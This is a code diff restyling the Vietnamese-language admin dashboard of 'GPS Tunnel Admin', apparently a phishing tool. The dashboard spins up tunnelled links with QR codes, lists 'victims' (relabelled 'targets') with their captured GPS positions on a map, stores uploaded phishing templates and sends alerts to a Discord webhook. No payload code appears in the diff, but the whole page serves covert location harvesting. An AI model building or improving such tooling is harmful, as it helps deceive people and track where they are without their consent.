@@ -3,66 +3,101 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>🛡️ GPS Tunnel Admin – Quest Edition</title>
-  <link rel="stylesheet" href="/static/css/style.css">
+  <title>🛡️ GPS Tunnel Admin – Red Broadcast</title>
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Roboto+Mono&display=swap" rel="stylesheet">
+  <!-- Leaflet CSS -->
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="frontend/css/style.css">
 </head>
-<body>
+<body class="admin-body">
+
   <!-- Sidebar -->
-  <nav id="sidebar">
-    <div class="logo">⚔️ GPS Tunnel</div>
+  <nav id="sidebar" class="admin-sidebar">
+    <div class="logo">
+      <span class="logo-text">GPS <span class="logo-accent">Tunnel</span></span>
+    </div>
     <ul class="nav-links">
-      <li class="nav-item active" data-tab="overview">📊 Tổng quan</li>
-      <li class="nav-item" data-tab="tunnels">🔗 Quản lý Tunnel</li>
-      <li class="nav-item" data-tab="victims">🎯 Nạn nhân</li>
-      <li class="nav-item" data-tab="templates">📜 Templates</li>
-      <li class="nav-item" data-tab="settings">⚙️ Cài đặt</li>
+      <li class="nav-item active" data-tab="overview">
+        <span class="nav-icon">📊</span>
+        <span class="nav-label">Tổng quan</span>
+      </li>
+      <li class="nav-item" data-tab="tunnels">
+        <span class="nav-icon">🔗</span>
+        <span class="nav-label">Quản lý Tunnel</span>
+      </li>
+      <li class="nav-item" data-tab="victims">
+        <span class="nav-icon">🎯</span>
+        <span class="nav-label">Mục tiêu (GPS)</span>
+      </li>
+      <li class="nav-item" data-tab="templates">
+        <span class="nav-icon">📜</span>
+        <span class="nav-label">Mẫu Phishing</span>
+      </li>
+      <li class="nav-item" data-tab="settings">
+        <span class="nav-icon">⚙️</span>
+        <span class="nav-label">Cài đặt</span>
+      </li>
     </ul>
     <div class="sidebar-footer">
-      <span id="connection-status">🟢 Đã kết nối</span>
+      <span id="connection-status" class="status-dot status-online"></span>
+      <span>Hệ thống sẵn sàng</span>
     </div>
   </nav>
 
   <!-- Main content -->
-  <main id="main-content">
+  <main id="main-content" class="admin-main">
+
     <!-- Tab Overview -->
     <section id="tab-overview" class="tab-content active">
-      <h2>📊 Tổng quan hệ thống</h2>
+      <h2 class="section-title">Tổng quan hệ thống</h2>
       <div class="cards-grid">
         <div class="stat-card">
-          <h3>Tổng Tunnel</h3>
-          <p id="stat-total-tunnels">0</p>
+          <span class="card-label">Tổng Tunnel</span>
+          <span class="card-value" id="stat-total-tunnels">0</span>
         </div>
         <div class="stat-card">
-          <h3>Đang chạy</h3>
-          <p id="stat-running-tunnels">0</p>
+          <span class="card-label">Đang hoạt động</span>
+          <span class="card-value" id="stat-running-tunnels">0</span>
         </div>
         <div class="stat-card">
-          <h3>Nạn nhân hôm nay</h3>
-          <p id="stat-victims-today">0</p>
+          <span class="card-label">Mục tiêu hôm nay</span>
+          <span class="card-value" id="stat-victims-today">0</span>
         </div>
         <div class="stat-card">
-          <h3>Tổng nạn nhân</h3>
-          <p id="stat-victims-total">0</p>
+          <span class="card-label">Tổng mục tiêu</span>
+          <span class="card-value" id="stat-victims-total">0</span>
         </div>
       </div>
       <div class="quick-actions">
-        <button class="btn-primary" onclick="createTunnel(1)">+ Tạo 1 Tunnel</button>
-        <button class="btn-danger" onclick="stopAllTunnels()">⏹️ Dừng tất cả</button>
+        <button class="btn-primary" onclick="createTunnel(1)">+ Triển khai Tunnel</button>
+        <button class="btn-outlined" onclick="stopAllTunnels()">⏹ Dừng tất cả</button>
       </div>
     </section>
 
     <!-- Tab Tunnels -->
     <section id="tab-tunnels" class="tab-content">
-      <h2>🔗 Quản lý Tunnel</h2>
+      <h2 class="section-title">Quản lý Tunnel</h2>
       <div class="toolbar">
-        <input type="number" id="tunnel-quantity" value="1" min="1" max="20" placeholder="Số lượng">
-        <button class="btn-primary" onclick="createTunnel()">Tạo Tunnel</button>
-        <button class="btn-secondary" onclick="loadTunnels()">🔄 Làm mới</button>
+        <div class="toolbar-group">
+          <input type="number" id="tunnel-quantity" value="1" min="1" max="20" class="admin-input" placeholder="Số lượng">
+          <button class="btn-primary" onclick="createTunnel()">Tạo Tunnel</button>
+          <button class="btn-secondary" onclick="loadTunnels()">🔄 Làm mới</button>
+        </div>
+        <div class="toolbar-group">
+          <div class="chip-bar">
+            <span class="chip active" data-filter="all">Tất cả</span>
+            <span class="chip" data-filter="running">Đang chạy</span>
+            <span class="chip" data-filter="error">Lỗi</span>
+            <span class="chip" data-filter="stopped">Đã dừng</span>
+          </div>
+        </div>
       </div>
       <div class="table-container">
-        <table id="tunnels-table">
+        <table id="tunnels-table" class="admin-table">
           <thead>
             <tr>
               <th>ID</th>
@@ -79,10 +114,10 @@
 
     <!-- Tab Victims -->
     <section id="tab-victims" class="tab-content">
-      <h2>🎯 Nạn nhân</h2>
+      <h2 class="section-title">Cơ sở dữ liệu Mục tiêu</h2>
       <div class="two-columns">
         <div class="table-container">
-          <table id="victims-table">
+          <table id="victims-table" class="admin-table">
             <thead>
               <tr>
                 <th>Thời gian</th>
@@ -95,42 +130,50 @@
             <tbody></tbody>
           </table>
         </div>
-        <div id="map" style="height: 400px;"></div>
+        <div id="map" class="map-container"></div>
       </div>
     </section>
 
     <!-- Tab Templates -->
     <section id="tab-templates" class="tab-content">
-      <h2>📜 Templates Phishing</h2>
-      <button class="btn-primary" onclick="uploadTemplate()">📤 Upload Template Mới</button>
+      <h2 class="section-title">Mẫu Phishing</h2>
+      <button class="btn-primary" onclick="uploadTemplate()">📤 Tải lên Mẫu Mới</button>
       <div id="template-list" class="grid-list"></div>
     </section>
 
     <!-- Tab Settings -->
     <section id="tab-settings" class="tab-content">
-      <h2>⚙️ Cài đặt</h2>
-      <form id="settings-form">
-        <label>Discord Webhook URL</label>
-        <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
-        <label>Giới hạn tunnel tối đa</label>
-        <input type="number" id="max-tunnels" value="20">
-        <label>Tự động dừng tunnel sau (phút, 0 = không giới hạn)</label>
-        <input type="number" id="auto-stop-minutes" value="0">
-        <button type="submit" class="btn-primary">💾 Lưu cài đặt</button>
+      <h2 class="section-title">Cấu hình Hệ thống</h2>
+      <form id="settings-form" class="admin-form">
+        <div class="form-group">
+          <label for="webhook-url">Discord Webhook URL</label>
+          <input type="text" id="webhook-url" class="admin-input" placeholder="https://discord.com/api/webhooks/...">
+        </div>
+        <div class="form-group">
+          <label for="max-tunnels">Giới hạn Tunnel tối đa</label>
+          <input type="number" id="max-tunnels" class="admin-input" value="20">
+        </div>
+        <div class="form-group">
+          <label for="auto-stop-minutes">Tự động dừng sau (phút, 0 = không giới hạn)</label>
+          <input type="number" id="auto-stop-minutes" class="admin-input" value="0">
+        </div>
+        <button type="submit" class="btn-primary">💾 Lưu Cài đặt</button>
       </form>
     </section>
+
   </main>
 
   <!-- Modal QR -->
-  <div id="qr-modal" class="modal">
+  <div id="qr-modal" class="modal-overlay">
     <div class="modal-content">
-      <span class="close" onclick="closeModal()">&times;</span>
+      <span class="modal-close" onclick="closeModal()">&times;</span>
       <img id="qr-image" src="" alt="QR Code">
-      <p id="qr-url"></p>
+      <p id="qr-url" class="code-text"></p>
     </div>
   </div>
 
+  <!-- Scripts -->
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-  <script src="/static/js/app.js"></script>
+  <script src="frontend/js/app.js"></script>
 </body>
 </html>
